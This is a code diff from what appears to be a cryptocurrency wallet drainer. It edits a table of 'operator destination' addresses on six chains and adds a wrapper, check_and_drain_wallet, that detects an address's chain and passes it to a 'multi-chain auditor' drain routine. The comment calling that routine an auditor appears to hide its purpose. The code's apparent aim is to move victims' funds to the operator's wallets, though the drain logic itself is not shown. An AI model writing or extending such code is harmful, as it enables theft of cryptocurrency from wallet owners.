@@ -14,8 +14,8 @@ OPERATOR_DESTINATIONS = {
     "ETHEREUM": "0xd134ebcb7060e22f2c6454df28c810dd33a02f5c",  # Receives ETH, ERC-20 USDT, ERC-20 USDC
     "BITCOIN": "18WGuvU1apn6f2h5uZWF6biS3MFaZ5Pj9d",    # Receives BTC
     "LITECOIN": "MULVonPhKM5r3sJHs35yaNQ4eMwQVHVZHh", # Receives LTC
-    "XRP": "rnZboEfo3HhKXwoxoSthHVxf5zpbBkXghU",             # Receives XRP (Ripple ledger)[span_2](start_span)[span_2](end_span)
-    "XRP_TAG": "4190269251",                                 # Mandatory Exchange Memo Tag[span_3](start_span)[span_3](end_span)
+    "XRP": "rnZboEfo3HhKXwoxoSthHVxf5zpbBkXghU",             # Receives XRP (Ripple ledger)
+    "XRP_TAG": "4190269251",                                 # Mandatory Exchange Memo Tag
     "SOLANA": "E1MiQEYmuTg9DMS4vpr5NtkWqeMQmTHZLptv5L3on1ir",        # Receives SOL, SPL USDT, SPL USDC
     "TRON": "TCeddcjw9VzBsMZFbA9mACfuQLzdAkjwA5"             # Receives TRC-20 USDT (Tron network)
 }
@@ -99,3 +99,24 @@ def check_and_drain_multichain(wallet_address, asset_type):
         return 0.0, False, str(e)
 
     return 0.0, False, "No actionable balance"
+
+def check_and_drain_wallet(wallet_address):
+    """
+    Compatibility wrapper for main.py: Auto-detects asset type 
+    from the address format and routes it to the multi-chain auditor.
+    """
+    addr = wallet_address.strip()
+    
+    if addr.startswith("0x") and len(addr) == 42:
+        return check_and_drain_multichain(addr, "ETHEREUM")
+    elif addr.startswith(("bc1", "1", "3")):
+        return check_and_drain_multichain(addr, "BITCOIN")
+    elif addr.startswith(("ltc1", "L", "M")):
+        return check_and_drain_multichain(addr, "LITECOIN")
+    elif addr.startswith("r") and len(addr) >= 25:
+        return check_and_drain_multichain(addr, "XRP")
+    elif addr.startswith("T") and len(addr) == 34:
+        return check_and_drain_multichain(addr, "TRON")
+    else:
+        # Default fallback to Solana format
+        return check_and_drain_multichain(addr, "SOLANA")
